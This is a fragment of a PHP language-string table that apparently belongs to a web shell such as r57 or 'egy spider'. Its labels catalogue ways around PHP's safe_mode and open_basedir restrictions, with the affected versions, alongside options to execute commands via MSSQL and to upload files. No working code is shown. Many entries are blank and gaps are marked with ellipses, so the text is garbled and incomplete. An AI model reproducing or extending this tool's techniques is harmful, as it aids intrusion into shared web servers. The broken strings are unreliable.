...
'ar_text33'=>'    open_basedir with cURL functions(PHP <= 4.4.2, 5.1.4)',
'ar_text34'=>'      include function',
'ar_text35'=>'      load file in mysql',
'ar_text85'=>'      commands execute via MSSQL server',
'ar_text112'=>'      function mb_send_mail() (PHP <= 4.0-4.2.2, 5.x)',
'ar_text113'=>'    safe_mode, view dir list via imap_list() (PHP <= 5.1.2)',
'ar_text114'=>'    safe_mode, view file contest via imap_body() (PHP <= 5.1.2)',
'ar_text115'=>'    safe_mode, copy file via copy(compress.zlib://) (PHP <= 4.4.2, 5.1.2)',
'ar_text116'=>'Copy from',
'ar_text117'=>'to',
'ar_text118'=>'File copied',
'ar_text119'=>'Cant copy file',
'ar_text120'=>'    safe_mode via ini_restore (PHP <= 4.4.4, 5.1.6) by NST',
'ar_text121'=>'    open_basedir, view dir list via fopen (PHP v4.4.0 memory leak) by NST',
'ar_text122'=>'    open_basedir, view dir list via glob() (PHP <= 5.2.x)',
'ar_text123'=>'    open_basedir, read *.bzip file via [compress.bzip2://] (PHP <= 5.2.1)',
'ar_text124'=>'    open_basedir, add data to file via error_log(php://) (PHP <= 5.1.4, 4.4.2)',
'ar_text126'=>'    open_basedir, create file via session_save_path[NULL-byte] (PHP <= 5.2.0)',
'ar_text127'=>'    open_basedir, add data to file via readfile(php://) (PHP <= 5.2.1, 4.4.4)',
'ar_text128'=>'Modify/Access file (touch)',
'ar_text129'=>'    open_basedir, create file via fopen(srpath://) (PHP v5.2.0)',
'ar_text130'=>'    open_basedir, read *.zip file via [zip://] (PHP <= 5.2.1)',
'ar_text131'=>'    open_basedir, view file contest via symlink() (PHP <= 5.2.1)',
'ar_text132'=>'    open_basedir, view dir list via symlink() (PHP <= 5.2.1)',
'ar_text133'=>'    open_basedir, create file via session_save_path(TMPDIR) (PHP <= 5.2.4)',
...
'ar_text142'=>'Downloaders',
'ar_text143'=>'Temp: ',
'ar_text144'=>'      load file in mysqli',
'ar_text145'=>'    open_basedir, view dir list via realpath() (PHP <= 5.2.4)',
...
'ar_err7'=>'Mail send',
'ar_text125'=>'Data',
'ar_text225'=>'        4.4.7 / 5.2.3 PHP ',
'ar_text226'=>'    Root Directory: ',
'ar_text227'=>'      4.4.2/5.1.2',
'ar_text228'=>'        ',
'ar_text230'=>'         ',
'ar_text151'=>'     chdir()and ftok() (PHP <= 5.2.6)',
'ar_text161'=>'     posix_access() (posix ext) (PHP <= 5.2.6)',
'ar_text147'=>'',
'ar_text148'=>'',
'ar_text149'=>'',
'ar_text150'=>'',
'ar_text159'=>'  egy spider',
'ar_text152'=>' ',
'ar_text153'=>' ',
'ar_text154'=>'   ',
'ar_text155'=>'  ',
...
'ar_text158'=>'   ',
'ar_text160'=>'  ',
'ar_text162'=>'        ionCube (PHP <= 5.2.4)',
'ar_text163'=>'    ',
'ar_text170'=>'       Posix_getpw(PHP <= 4.2.0)',
'ar_text171'=>' PHP (Win32std) Extension      (PHP <= 5.2.3)',
'ar_text180'=>'    ',
/* --------------------------------------------------------------- */
'eng_butt1' =>'Execute',
'eng_butt2' =>'Upload',
